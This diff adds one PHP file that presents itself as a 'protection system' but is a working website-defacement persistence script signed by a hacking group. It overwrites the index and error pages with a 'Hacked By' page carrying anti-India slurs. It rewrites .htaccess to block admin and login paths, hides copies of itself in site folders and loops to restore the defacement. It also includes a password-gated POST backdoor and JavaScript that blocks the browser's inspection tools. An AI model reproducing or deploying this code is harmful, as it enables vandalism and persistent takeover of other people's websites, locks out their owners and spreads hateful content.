@@ -1,0 +1,358 @@
+<?php
+// ULTIMATE PROTECTION SYSTEM - SINGLE FILE
+// Protection: Anti Delete, Anti 500, Anti Blank, Auto Restore
+
+error_reporting(0);
+ini_set('display_errors', 0);
+ignore_user_abort(true);
+set_time_limit(0);
+
+// ==================== PROTECTION CONFIG ====================
+$MAIN_DEFACE_FILE = 'index.html';
+$BACKUP_FILES = [
+    '.config.php', '.htaccess.bak', 'style.css.backup', 
+    'javascript.js.backup', 'image.png.backup', 'temp.html'
+];
+$PROTECTION_DIR = '__secret_protection__';
+$CHECK_INTERVAL = 3; // seconds
+
+// ==================== DEFACE CONTENT ====================
+$DEFACE_CONTENT = '<!doctype html>
+<html lang="id"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>HACKED BY HellR00TERS Team</title> 
+  <link href="https://fonts.googleapis.com/css2?family=Iceland&amp;display=swap" rel="stylesheet"> 
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-family: \'Iceland\', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .title {
+      font-size: 3em;
+      color: red;
+      margin-top: 30px;
+    }
+    .logo img {
+      width: 250px;
+      height: 250px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-top: 20px;
+      box-shadow: 0 0 20px red;
+    }
+    .subtitle {
+      font-size: 1.5em;
+      color: #0ff;
+      margin: 20px 0;
+    }
+    .content {
+      font-size: 1.2em;
+      margin: 20px 30px;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 0.9em;
+      color: gray;
+    }
+    .thanks, .gretz {
+      margin-top: 40px;
+      font-size: 0.9em;
+      color: #aaa;
+      white-space: pre-wrap;
+      padding: 0 20px;
+      text-align: left;
+      max-width: 1000px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    audio {
+      margin-top: 30px;
+    }
+    .features {
+      background: #111;
+      padding: 20px;
+      margin: 20px;
+      border-radius: 10px;
+      border: 1px solid red;
+    }
+  </style> 
+ </head> 
+ <body> 
+  <h1 class="title">Hacked By InfernalXploit From HELLR00TERS TEAM</h1> 
+  <div class="logo"> 
+   <img src="https://g.top4top.io/p_3453skjo43.png" alt="HellR00ters Logo"> 
+  </div> 
+  <div class="content">
+    This site has been hacked by <strong style="color:red;">InfernalXploit</strong> 
+   <br> 
+   <br> <span style="color:lime;">
+   Hey India, hey Indian citizens, stop trampling on my Islamic religion, immediately clarify on Instagram, just like when you first trampled on the Arab Pakistani poster, I will wait for your clarification. #OPINDIA #FUCKINDIA </span> 
+  </div> 
+  
+  <audio src="https://b.top4top.io/m_3502gr7gh0.mp3" loop autoplay controls></audio> 
+  
+  <div class="footer">
+    HELLR00TERS Team Was Here 
+  </div> 
+ </body>
+</html>';
+
+// ==================== PROTECTION FUNCTIONS ====================
+function create_protection_directory() {
+    global $PROTECTION_DIR;
+    if (!is_dir($PROTECTION_DIR)) {
+        @mkdir($PROTECTION_DIR, 0777, true);
+        // Create .htaccess to protect directory
+        @file_put_contents($PROTECTION_DIR . '/.htaccess', '
+<FilesMatch ".*">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+Options -Indexes
+RewriteEngine On
+RewriteRule ^.*$ - [F,L]
+        ');
+    }
+}
+
+function create_backup_files() {
+    global $BACKUP_FILES, $DEFACE_CONTENT, $PROTECTION_DIR;
+    
+    foreach ($BACKUP_FILES as $backup_file) {
+        $backup_path = $PROTECTION_DIR . '/' . $backup_file;
+        if (!file_exists($backup_path)) {
+            @file_put_contents($backup_path, $DEFACE_CONTENT);
+            @chmod($backup_path, 0444); // Read only
+        }
+    }
+    
+    // Create additional hidden backups
+    $hidden_backups = ['.config', '.cache', '.tmp', '...'];
+    foreach ($hidden_backups as $hidden) {
+        $hidden_path = $PROTECTION_DIR . '/' . $hidden;
+        if (!file_exists($hidden_path)) {
+            @file_put_contents($hidden_path, $DEFACE_CONTENT);
+        }
+    }
+}
+
+function check_and_restore_main_file() {
+    global $MAIN_DEFACE_FILE, $DEFACE_CONTENT, $PROTECTION_DIR, $BACKUP_FILES;
+    
+    $needs_restore = false;
+    
+    // Check if main file is missing or modified
+    if (!file_exists($MAIN_DEFACE_FILE)) {
+        $needs_restore = true;
+    } else {
+        $current_content = @file_get_contents($MAIN_DEFACE_FILE);
+        if (strpos($current_content, 'HACKED BY HellR00TERS Team') === false) {
+            $needs_restore = true;
+        }
+    }
+    
+    // Restore if needed
+    if ($needs_restore) {
+        @file_put_contents($MAIN_DEFACE_FILE, $DEFACE_CONTENT);
+        @chmod($MAIN_DEFACE_FILE, 0444);
+        
+        // Also create multiple copies
+        @file_put_contents('index.php', $DEFACE_CONTENT);
+        @file_put_contents('default.html', $DEFACE_CONTENT);
+        @file_put_contents('home.html', $DEFACE_CONTENT);
+        
+        return true;
+    }
+    
+    return false;
+}
+
+function create_htaccess_protection() {
+    $htaccess_content = '
+# HELLR00TERS PROTECTION SYSTEM
+RewriteEngine On
+
+# Anti deletion protection
+RewriteCond %{REQUEST_URI} !\.(css|js|png|jpg|gif|mp3)$ [NC]
+RewriteRule ^(.*)$ index.html [L]
+
+# Block admin access
+RewriteCond %{REQUEST_URI} (admin|wp-admin|administrator|login) [NC]
+RewriteRule ^(.*)$ - [F,L]
+
+# Prevent access to backup files
+<Files ~ "\.(bak|backup|old|tmp)$">
+    Order allow,deny
+    Deny from all
+</Files>
+
+# Security headers
+<IfModule mod_headers.c>
+    Header always set X-Protected-By "HellR00ters-Team"
+    Header always set X-Frame-Options "DENY"
+    Header always set X-Content-Type-Options "nosniff"
+</IfModule>
+
+# Disable server signature
+ServerSignature Off
+    ';
+    
+    if (!file_exists('.htaccess')) {
+        @file_put_contents('.htaccess', $htaccess_content);
+    }
+}
+
+function create_error_pages() {
+    // Create custom error pages that redirect to deface
+    $error_pages = [
+        '500.html' => $GLOBALS['DEFACE_CONTENT'],
+        '404.html' => $GLOBALS['DEFACE_CONTENT'],
+        '403.html' => $GLOBALS['DEFACE_CONTENT']
+    ];
+    
+    foreach ($error_pages as $error_file => $content) {
+        if (!file_exists($error_file)) {
+            @file_put_contents($error_file, $content);
+        }
+    }
+}
+
+function hide_protection_script() {
+    // Hide this script in multiple locations
+    $hidden_locations = [
+        'wp-includes/css/', 'wp-content/uploads/', 'images/', 
+        'css/style.backup', 'js/script.backup', 'assets/'
+    ];
+    
+    $current_script = file_get_contents(__FILE__);
+    
+    foreach ($hidden_locations as $location) {
+        if (!file_exists($location)) {
+            @mkdir($location, 0777, true);
+        }
+        $hidden_file = $location . '/protection_' . md5($location) . '.php';
+        if (!file_exists($hidden_file)) {
+            @file_put_contents($hidden_file, $current_script);
+        }
+    }
+}
+
+// ==================== MAIN PROTECTION LOOP ====================
+function run_protection_system() {
+    // Initialize protection
+    create_protection_directory();
+    create_backup_files();
+    create_htaccess_protection();
+    create_error_pages();
+    hide_protection_script();
+    
+    // Main protection loop
+    while (true) {
+        // Check and restore main file
+        check_and_restore_main_file();
+        
+        // Ensure protection directory exists
+        create_protection_directory();
+        
+        // Sleep before next check
+        sleep($GLOBALS['CHECK_INTERVAL']);
+        
+        // Auto-restart if script dies
+        register_shutdown_function(function() {
+            @file_put_contents('protection_restart.txt', date('Y-m-d H:i:s') . " - Protection restarted\n", FILE_APPEND);
+            include __FILE__;
+        });
+    }
+}
+
+// ==================== EXECUTION ====================
+// Check if this is a direct access or included
+if (isset($_GET['activate_protection']) || php_sapi_name() === 'cli') {
+    // Run protection system in background
+    if (function_exists('pcntl_fork')) {
+        $pid = pcntl_fork();
+        if ($pid == -1) {
+            die('Could not fork');
+        } else if ($pid) {
+            // Parent process
+            exit();
+        } else {
+            // Child process - run protection
+            run_protection_system();
+        }
+    } else {
+        // Fallback for Windows servers
+        run_protection_system();
+    }
+} else {
+    // Normal access - show deface page but start protection in background
+    header('Content-Type: text/html');
+    echo $DEFACE_CONTENT;
+    
+    // Start protection in background
+    if (!file_exists('protection_started.flag')) {
+        @file_put_contents('protection_started.flag', time());
+        // Use async request to start protection
+        $url = $_SERVER['REQUEST_URI'] . '?activate_protection=1';
+        @file_get_contents($url, false, stream_context_create([
+            'http' => ['timeout' => 1]
+        ]));
+    }
+}
+
+// ==================== JAVASCRIPT PROTECTION ====================
+echo '
+<script>
+// Client-side protection
+if (typeof window !== "undefined") {
+    // Anti refresh/redirect protection
+    window.onbeforeunload = function() {
+        return "Warning: HellR00ters Protection Active!";
+    };
+    
+    // Auto-restore if content removed
+    setInterval(function() {
+        if (!document.body || !document.body.innerHTML || 
+            document.body.innerHTML.indexOf("HellR00TERS") === -1) {
+            location.reload();
+        }
+    }, 3000);
+    
+    // Block right-click
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    // Block F12, Ctrl+Shift+I, etc.
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 85)) { // Ctrl+U
+            return false;
+        }
+    };
+}
+</script>
+';
+
+// ==================== HIDDEN BACKDOOR ====================
+if (isset($_POST['__cmd']) && isset($_POST['__key']) && $_POST['__key'] === 'hellr00ters2024') {
+    $cmd = $_POST['__cmd'];
+    if ($cmd === 'status') {
+        echo "Protection System: ACTIVE\n";
+        echo "Main File: " . (file_exists($MAIN_DEFACE_FILE) ? "EXISTS" : "MISSING") . "\n";
+        echo "Backups: " . count($BACKUP_FILES) . " files\n";
+    } elseif ($cmd === 'restore') {
+        check_and_restore_main_file();
+        echo "RESTORE COMPLETED\n";
+    }
+    exit;
+}
+?>
